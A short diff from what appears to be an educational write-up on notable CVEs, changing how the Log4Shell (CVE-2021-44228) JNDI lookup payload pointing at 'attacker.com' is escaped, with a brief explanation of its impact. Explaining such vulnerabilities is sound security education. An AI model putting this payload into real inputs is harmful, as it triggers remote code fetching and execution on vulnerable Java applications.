@@ -228,7 +228,7 @@ NOTABLE CVEs & INCIDENTS:
 
 2. LOG4SHELL (CVE-2021-44228) — Java Log4j:
    Not traditional OS command injection, but injection via JNDI lookup:
-     ${jndi:ldap://attacker.com/exploit}
+     \${jndi:ldap://attacker.com/exploit}
    When logged by Log4j, it fetches and executes a remote Java class.
    Impact: Affected virtually every enterprise Java application.
    CVSS Score: 10.0. One of the worst vulnerabilities ever discovered.
